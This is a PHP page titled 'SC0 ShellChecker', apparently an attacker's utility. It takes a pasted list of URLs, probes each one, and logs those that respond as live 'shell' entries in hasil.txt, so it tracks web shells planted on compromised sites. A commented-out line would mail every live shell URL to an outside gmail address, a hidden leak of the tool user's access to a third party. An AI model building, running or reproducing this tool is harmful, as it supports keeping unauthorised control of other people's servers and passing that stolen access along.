<?php echo "<style type=\"text/css\">
.entryfield {width:400px;height:150px;}
.subbtn {background:#b70505;color:white;border: 1px solid #000; padding:6px 6px 6px 6px;}
.subbtn:hover {background:#c0bfbf;color:#000000;}
.image {
    width: 250px;
    height: 250px;
    -webkit-animation:spin 8s linear infinite;
    -moz-animation:spin 8s linear infinite;
    animation:spin 8s linear infinite;
}
@-moz-keyframes spin { 100% { -moz-transform: rotate(-360deg); } }
@-webkit-keyframes spin { 100% { -webkit-transform: rotate(-360deg); } }
@keyframes spin { 100% { -webkit-transform: rotate(-360deg); transform:rotate(-360deg); } }


</style>

<font face='Ubuntu'>
<center><img class='image' src='sc0.png' width='220' height='220'>
<p>
<body bgcolor='black'>
<form name=\"frmcontadd\" action=\"\" method=\"post\">

  <textarea class=\"entryfield\" name=\"url\" cols=115 rows=10></textarea><br>
  <br>
  <input class=\"subbtn\" type=\"submit\" name=\"Submit\" value=\"  >  \">

</form>";
function get_http_response_code($theurl) {
    $headers = get_headers($theurl);
    $status = substr($headers[0], 9, 3);
    $p = parse_url($theurl);
    $host = explode(':', $p['host']);
    $hostname = $host[0];
    if ($status == 200) {
        $visitor = $_SERVER["REMOTE_ADDRS"];
        $judul = "shell: $theurl ";
        $body = "shell: $theurl";
        if (!empty($theurl)) {
/// I hate myself go delete this line            @mail("anakmancasan@gmail.com", $judul, $body);
        }
        $writeuRl = $theurl . "
";
        $fh = fopen("hasil.txt", "a");
        fwrite($fh, $writeuRl, strlen($writeuRl));
        echo "<strong><font color=Green>OK</font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
    } elseif ($status == 500) {
        echo "<strong><font color=black>" . $status . " 500</font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
    } else {
        $writeuRl = $theurl . "
";
        $fh = fopen("sampah.txt", "a");
        fwrite($fh, $writeuRl, strlen($writeuRl));
        echo "<strong><font color=red>Not Found</font></strong> - <i><a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</i></a><br />";
    }
}
if (isset($_POST['Submit'])) {
    $hosts = explode("
", $_POST['url']);
    $values = array();
    foreach ($hosts as $host) {
        if ($host != "") {
            @get_http_response_code("$host");
        }
    }
    
}
?>

<br>
<br>
<font color='gray'><i><b>Even in the deep of darkness, 0ur eyes still shine.</i></b>
<title>[!] SC0 ShellChecker [!]</title>
</html>
